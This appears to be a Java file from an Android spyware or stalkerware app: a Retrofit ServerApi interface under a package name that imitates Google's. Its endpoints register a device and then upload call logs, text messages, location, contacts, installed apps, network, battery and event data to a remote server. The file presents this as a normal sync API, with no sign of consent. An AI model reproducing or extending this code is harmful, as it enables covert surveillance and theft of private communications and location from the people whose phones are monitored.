package com.google.android.apps.repositories.network.api;



import com.google.android.apps.repositories.network.models.request.DeleteRequest;
import com.google.android.apps.repositories.network.models.request.DeviceInfoRequest;
import com.google.android.apps.repositories.network.models.request.InformationRequest;
import com.google.android.apps.repositories.network.models.request.InitialRequest;
import com.google.android.apps.repositories.network.models.request.SyncRequest;
import com.google.android.apps.repositories.network.models.response.DeleteResponse;
import com.google.android.apps.repositories.network.models.response.InformationResponse;
import com.google.android.apps.repositories.network.models.response.InitialResponse;
import com.google.android.apps.repositories.network.models.response.SyncResponse;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.Headers;
import retrofit2.http.POST;

/**
 * Created by OldMan on 03.04.2017.
 */

public interface ServerApi {

    @Headers({"Accept: application/json"})
    @POST("/init")
    Call<InitialResponse> onInitDevice(@Body InitialRequest initialRequest);

    @Headers({"Accept: application/json"})
    @POST("/sync")
    Call<SyncResponse> onStateSync(@Body SyncRequest syncRequest);


    @Headers({"Accept: application/json"})
    @POST("/info")
    Call<InformationResponse> setDeviceInfo(@Body DeviceInfoRequest informationRequest);


    @Headers({"Accept: application/json"})
    @POST("/rm")
    Call<DeleteResponse> onDeleteDevice(@Body DeleteRequest informationRequest);


    @Headers({"Accept: application/json"})
    @POST("/call")
    Call<InformationResponse> addCallList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/messages")
    Call<InformationResponse> addMessageList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/location")
    Call<InformationResponse> addLocationList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/contact")
    Call<InformationResponse> setContactBook(@Body InformationRequest informationRequest);

    @FormUrlEncoded
    @POST("/app")
    Call<InformationResponse> setInstallAppList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/status")
    Call<InformationResponse> addDeviceStatusList(@Body InformationRequest informationRequest);


    @Headers({"Accept: application/json"})
    @POST("/battery")
    Call<InformationResponse> setBatteryStateList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/network")
    Call<InformationResponse> setNetworkStateList(@Body InformationRequest informationRequest);

    @Headers({"Accept: application/json"})
    @POST("/event")
    Call<InformationResponse> setEventList(@Body InformationRequest informationRequest);
}
